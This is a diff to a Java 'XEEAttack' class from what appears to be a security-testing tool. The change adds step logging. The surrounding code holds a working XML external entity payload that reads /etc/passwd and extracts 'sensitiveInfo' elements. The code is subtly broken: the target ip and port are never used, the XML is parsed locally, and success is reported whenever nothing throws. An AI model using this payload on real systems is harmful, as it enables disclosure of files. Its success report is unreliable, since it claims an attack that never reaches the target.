@@ -22,29 +22,31 @@ public class XEEAttack implements Attack {
 
     @Override
     public void run(Report report, String ip, int port) {
-
-
-
-
         try {
+            System.out.println("Step 1: Initializing XEE Attack");
             DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
             DocumentBuilder builder = factory.newDocumentBuilder();
 
+            System.out.println("Step 2: Creating malicious XML");
             String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                     + "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>"
                     + "<foo>&xxe;</foo>";
 
+            System.out.println("Step 3: Parsing the malicious XML");
             Document document = builder.parse(new InputSource(new StringReader(maliciousXml)));
 
+            System.out.println("Step 4: Extracting root content");
             String rootContent = document.getDocumentElement().getTextContent();
             report.append("Root Content: " + rootContent);
 
+            System.out.println("Step 5: Extracting content of 'node' elements");
             NodeList nodeList = document.getElementsByTagName("node");
             for (int i = 0; i < nodeList.getLength(); i++) {
                 Node node = nodeList.item(i);
                 report.append("Node " + i + " Content: " + node.getTextContent());
             }
 
+            System.out.println("Step 6: Extracting content of 'sensitiveInfo' elements");
             NodeList sensitiveInfoList = document.getElementsByTagName("sensitiveInfo");
             for (int i = 0; i < sensitiveInfoList.getLength(); i++) {
                 Node sensitiveInfoNode = sensitiveInfoList.item(i);
@@ -53,8 +55,10 @@ public class XEEAttack implements Attack {
             }
 
             // Save results in the report
+            System.out.println("Step 7: XEE Attack successful!");
             report.append("XEE Attack successful!");
         } catch (Exception e) {
+            System.out.println("XEE Attack failed: " + e.getMessage());
             report.append("XEE Attack failed: " + e.getMessage());
         }
     }
